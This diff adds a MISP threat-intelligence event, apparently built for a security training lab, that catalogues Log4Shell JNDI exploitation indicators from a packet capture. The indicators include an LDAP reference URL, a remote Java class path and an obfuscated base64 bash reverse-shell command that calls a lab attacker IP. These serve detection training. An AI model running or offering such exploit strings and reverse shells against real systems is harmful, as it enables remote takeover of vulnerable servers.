@@ -1,0 +1,289 @@
+{
+  "Event": {
+    "uuid": "94e9fbe0-4826-5d4d-be02-f45a1fc9a210",
+    "info": "IgniteCyber CJ LAB-3.4: Log4Shell JNDI Reference Traffic",
+    "date": "2025-08-14",
+    "threat_level_id": "2",
+    "analysis": "1",
+    "distribution": "0",
+    "published": false,
+    "disable_correlation": false,
+    "Tag": [
+      {
+        "name": "tlp:clear"
+      },
+      {
+        "name": "pap:green"
+      },
+      {
+        "name": "workflow:state=\"training-simulation\""
+      },
+      {
+        "name": "course:ignitecyber-academy"
+      },
+      {
+        "name": "victim:apexfin-solutions"
+      },
+      {
+        "name": "threat-actor:cinder-jackal"
+      },
+      {
+        "name": "training:data-only"
+      },
+      {
+        "name": "lab:LAB-3.4"
+      },
+      {
+        "name": "case:CJ-010B"
+      },
+      {
+        "name": "day:day-3-optional"
+      },
+      {
+        "name": "attack:technique=\"T1190\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Exploit Public-Facing Application - T1190\""
+      },
+      {
+        "name": "attack:technique=\"T1059.004\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Unix Shell - T1059.004\""
+      },
+      {
+        "name": "attack:technique=\"T1105\""
+      },
+      {
+        "name": "misp-galaxy:mitre-attack-pattern=\"Ingress Tool Transfer - T1105\""
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "77d20e9b-46e7-5444-b695-c53831f48879",
+        "type": "text",
+        "category": "Other",
+        "value": "case_id=CJ-010B",
+        "to_ids": false,
+        "comment": "TheHive/MISP case alignment key.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "context:case-id"
+          }
+        ]
+      },
+      {
+        "uuid": "b77a57c9-89ba-510d-a08f-3ecf8935647e",
+        "type": "text",
+        "category": "Other",
+        "value": "notebook=PCAP/SecurityEvent optional evidence",
+        "to_ids": false,
+        "comment": "Notebook or source artifact aligned to this MISP event.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "context:notebook"
+          }
+        ]
+      },
+      {
+        "uuid": "4c330ad2-80c1-5df1-8c25-a20b4a5cae6c",
+        "type": "text",
+        "category": "Other",
+        "value": "source_file=pcap_log4shell_cve2021_44228_jndi_reference_2022-05-11181020.pcap",
+        "to_ids": false,
+        "comment": "Telemetry/evidence source used to seed this CTI event.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "context:source-file"
+          }
+        ]
+      },
+      {
+        "uuid": "7f6b83e3-93d5-548e-87ff-6a51796fd40f",
+        "type": "text",
+        "category": "Other",
+        "value": "source_file=securityauditing_log4shell_cve2021_44228_java_serialized_object_2022-05-13045400.json",
+        "to_ids": false,
+        "comment": "Telemetry/evidence source used to seed this CTI event.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "context:source-file"
+          }
+        ]
+      },
+      {
+        "uuid": "894abcc7-007c-5e24-a282-08035518e29b",
+        "type": "url",
+        "category": "Network activity",
+        "value": "ldap://192.168.2.6:1389/o=reference",
+        "to_ids": true,
+        "comment": "JNDI LDAP reference observed in User-Agent string from PCAP.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "source:exploit-indicator"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          }
+        ]
+      },
+      {
+        "uuid": "85a049ba-4970-5a11-80d4-4e572b93aee1",
+        "type": "url",
+        "category": "Network activity",
+        "value": "http://192.168.2.6:8888/",
+        "to_ids": true,
+        "comment": "Remote Java class codebase observed in PCAP.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "source:exploit-infrastructure"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          }
+        ]
+      },
+      {
+        "uuid": "1e26eaed-6257-5bd5-8454-6833a748a794",
+        "type": "uri",
+        "category": "Network activity",
+        "value": "/Log4j-2.14.0-SNAPSHOT/api",
+        "to_ids": false,
+        "comment": "HTTP endpoint targeted in Log4Shell request.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "source:victim-endpoint"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          }
+        ]
+      },
+      {
+        "uuid": "82525848-3ada-580d-84c0-8792c8c6da86",
+        "type": "uri",
+        "category": "Network activity",
+        "value": "/xExportObject.class",
+        "to_ids": true,
+        "comment": "Java class retrieved during JNDI exploitation.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "source:payload-retrieval-path"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          }
+        ]
+      },
+      {
+        "uuid": "4062b60c-2fd1-5ffe-a122-73cbb792aa89",
+        "type": "ip-src",
+        "category": "Network activity",
+        "value": "192.168.3.5",
+        "to_ids": false,
+        "comment": "Source address observed initiating connection to Tomcat service in SecurityEvent data.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "source:lab-internal-ip"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          }
+        ]
+      },
+      {
+        "uuid": "08345901-0904-5b12-8b1a-e7b9765c1d20",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "192.168.2.5",
+        "to_ids": false,
+        "comment": "Tomcat destination host observed in SecurityEvent data.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "source:lab-victim-ip"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          }
+        ]
+      },
+      {
+        "uuid": "265027a6-8a70-5cc2-b7b8-2c2b80a70559",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "192.168.2.6",
+        "to_ids": false,
+        "comment": "LDAP/HTTP callback infrastructure IP observed in PCAP.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "source:lab-attacker-ip"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          }
+        ]
+      },
+      {
+        "uuid": "d484c32d-1b37-5527-b034-04dfa936ea90",
+        "type": "command-line",
+        "category": "External analysis",
+        "value": "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}",
+        "to_ids": true,
+        "comment": "Decoded reverse-shell payload carrier observed in PCAP strings.",
+        "distribution": "0",
+        "disable_correlation": false,
+        "first_seen": "2025-08-14",
+        "Tag": [
+          {
+            "name": "source:exploit-behavior"
+          },
+          {
+            "name": "lab:LAB-3.4"
+          }
+        ]
+      }
+    ],
+    "EventReport": [
+      {
+        "uuid": "ca11de15-1746-5f95-9756-7b2f2a44293e",
+        "name": "LAB-3.4 CTI Event Report",
+        "content": "# LAB-3.4 \u2014 Log4Shell JNDI Reference Traffic\n\n**Case:** CJ-010B  \n**Campaign:** Cinder Jackal vs ApexFin Solutions  \n**Date:** 2025-08-14  \n**ATT&CK:** T1190, T1059.004, T1105\n\n## Analyst narrative\nOptional network exploit evidence demonstrates a Log4Shell/JNDI request, LDAP reference, HTTP class retrieval, and reverse-shell style payload in a safe lab.\n\n## CTI promotion guidance\n- Promote only validated observables from TheHive/Cortex into this MISP event.\n- Keep `to_ids=false` for baseline infrastructure, documentation ranges, internal IPs, and workflow metadata.\n- Keep `to_ids=true` for behaviorally useful detection indicators such as malicious command lines, staged payload names, suspicious URLs, named pipes, and fictional campaign IOCs.\n- Add sightings during the lab when the same observable appears in Elastic/Wazuh/Zeek queries.\n\n## Source artifacts\n- pcap_log4shell_cve2021_44228_jndi_reference_2022-05-11181020.pcap\n- securityauditing_log4shell_cve2021_44228_java_serialized_object_2022-05-13045400.json\n",
+        "distribution": "0",
+        "deleted": false
+      }
+    ]
+  }
+}
